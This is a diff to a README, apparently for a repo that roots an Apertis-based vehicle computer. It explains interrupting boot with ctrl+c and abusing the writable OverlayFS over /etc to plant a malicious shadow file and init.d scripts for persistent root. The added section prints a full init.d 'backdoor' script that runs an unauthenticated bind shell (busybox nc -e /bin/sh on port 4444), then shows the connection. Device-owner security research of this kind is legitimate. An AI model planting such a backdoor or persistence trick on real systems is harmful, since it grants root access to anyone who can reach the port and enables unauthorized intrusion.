@@ -36,6 +36,53 @@ Multiple partitions are for use by the running Apertis instance.<br>
 /dev/mmcblk0p8 is the backup linux OS<br>
 /dev/mmcblk0p9 is the /home partition for Apertis<br>
 
+When the VCS boots rapidly pressing <ctrl+c> will interrupt the systemd startup scripts. Eventually you will be left with a black screen. Pressing <alt+f1> through <alt+f6> will allow access to tty's that can be used for login.<br>
+
+The exploit in this repo takes advantage of the OverlayFS used by the system.<br>
+```
+/ # mount|grep overlay
+overlay on /etc type overlay (rw,relatime,lowerdir=/root/etc,upperdir=/root/var/lib/overlays/etc/upper,workdir=/root/var/lib/overlays/etc/work)
+```
+
+Merging in malicious files into /etc allows for easy persistent root access. In this case we add a shadow file, and a few init.d scripts to trigger via rc.d runlevels 3-4. 
+```
+/ # ls /var/lib/overlays/etc/upper 
+NetworkManager
+init.d
+localtime
+machine-id
+mtab
+rc3.d
+rc4.d
+rc5.d
+resolv.conf
+shadow
+timezone
+```
+
+A simple backdoor allows for convienent access on demand via tty, or tcp port. 
+```
+/ # cat /var/lib/overlays/etc/upper/init.d/backdoor
+#! /bin/sh
+. /lib/lsb/init-functions
+
+set -e
+
+case "$1" in
+  start)
+        busybox nc -ll -p 4444 -e /bin/sh &
+        ;;
+  stop|reload|restart|force-reload|status)
+        ;;
+  *)
+        echo "Usage: backdoor {start|stop|restart|force-reload|status}" >&2
+        exit 1
+        ;;
+esac
+
+exit 0
+```
+
 Once you've gained root access via this repo you should see the following result:
 ```
 $ nc -vvv 192.168.1.28 4444
